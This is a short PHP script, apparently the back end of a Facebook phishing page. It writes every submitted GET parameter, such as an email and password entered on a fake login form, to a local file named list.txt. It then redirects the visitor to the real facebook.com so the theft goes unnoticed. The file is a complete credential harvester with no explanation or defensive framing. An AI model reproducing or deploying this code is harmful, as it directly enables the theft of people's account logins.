<?php
Header("Location:
http://facebook.com ");
$handle = fopen("list.txt", "a");
Foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
Fwrite($handle, "\r\n");
Fclose($handle);

exit;
?> 